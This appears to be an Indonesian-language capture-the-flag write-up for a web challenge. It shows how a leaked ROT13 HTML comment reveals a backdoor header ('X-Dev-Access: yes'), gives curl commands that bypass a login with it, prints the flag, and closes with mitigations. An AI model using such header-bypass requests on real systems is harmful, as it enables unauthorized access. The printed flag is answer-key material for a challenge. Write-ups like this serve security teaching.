# Writeup: Crack the Gate 1 (Challenge ID: 520)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Source Code Reconnaissance & Backdoor Header Bypass
- **Difficulty:** Easy
- **Author:** CMU-Africa Team
- **Event:** picoMini by CMU-Africa
- **Points:** 100
- **Flag:** `academy{brut4_f0rc4_dc8f7ab6}`

---

## Problem Statement & Scope
Dalam sebuah investigasi keamanan, seorang subjek pemeriksaan menggunakan alamat email `ctf-player@cylabacademy.org` untuk mengakses portal web internal yang dilindungi autentikasi kata sandi. Pengembang portal dicurigai meninggalkan jalan pintas (*backdoor*) rahasia untuk keperluan pengujian. Pemain ditugaskan menganalisis implementasi halaman login dan menemukan celah bypass untuk memperoleh flag.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Peninggalan Komentar Pengembang pada Dokumen HTML (Developer Comments Leakage):**
   Komentar dalam berkas HTML (`<!-- ... -->`) tetap dikirimkan ke klien secara utuh. Pengembang sering kali meninggalkan catatan konfigurasi pengujian internal, kredensial sementara, atau petunjuk bypass yang terlupa dihapus sebelum rilis.
2. **Obfuskasi Sederhana (Caesar Cipher / ROT13):**
   ROT13 (rotasi 13 karakter alfabet) bukanlah enkripsi kriptografis yang aman, melainkan bentuk obfuskasi sederhana. Setiap pengamat dapat membalikkan teks tersandi tanpa kunci rahasia.
3. **Penyalahgunaan Header Kustom untuk Akses Administratif (Insecure Header Trust):**
   Aplikasi backend yang mempercayai header HTTP yang dikirimkan klien (seperti `X-Dev-Access: yes` atau `X-Forwarded-For`) untuk memotong logika autentikasi inti rentan terhadap manipulasi header (*Header Injection / Parameter Tampering*).

---

## Rekonstruksi Eksploitasi Step-by-Step
1. Luncurkan instance lab web container:
   `PUT /api/challenges/520/instance/`
2. Unduh dan periksa kode sumber HTML halaman login:
   ```bash
   curl -s http://xebec.cylabacademy.net:31099/ | head -n 45
   ```
3. Temukan komentar tersembunyi pada header HTML:
   ```html
   <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
   <!-- Remove before pushing to production! -->
   ```
4. Dekode teks tersandi ROT13 tersebut menggunakan pipeline shell:
   ```bash
   echo 'ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
   # Output:
   # NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
   ```
5. Susun permintaan autentikasi POST ke endpoint `/login` dengan menyertakan header bypass `X-Dev-Access: yes`:
   ```bash
   curl -s -X POST http://xebec.cylabacademy.net:31099/login \
        -H "Content-Type: application/json" \
        -H "X-Dev-Access: yes" \
        -d '{"email":"ctf-player@cylabacademy.org","password":"any"}'
   ```
6. Server memverifikasi header bypass dan mengembalikan payload JSON berisi flag:
   ```json
   {
     "success": true,
     "email": "ctf-player@cylabacademy.org",
     "firstName": "pico",
     "lastName": "player",
     "flag": "academy{brut4_f0rc4_dc8f7ab6}"
   }
   ```

---

## Flag & Verifikasi
- **Flag:** `academy{brut4_f0rc4_dc8f7ab6}`
- **Verifikasi:** POST `/api/submissions/` mengembalikan respons `{"correct": true}` (HTTP Status 201).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Pembersihan Artefak Pengembangan (CI/CD Sanitization):** Terapkan proses linter dan pipeline build otomatis (misalnya menggunakan HTML minifier atau script scanning) untuk menghapus seluruh komentar kode dan debug flag sebelum kode masuk ke lingkungan produksi (*production build*).
- **Larangan Mekanisme Autentikasi Berbasis Header Sisi Klien:** Jangan pernah mengizinkan mekanisme bypass autentikasi berbasis header HTTP kustom yang dapat dimanipulasi oleh klien tanpa validasi identitas kriptografis (seperti mTLS atau JWT yang ditandatangani secara aman).
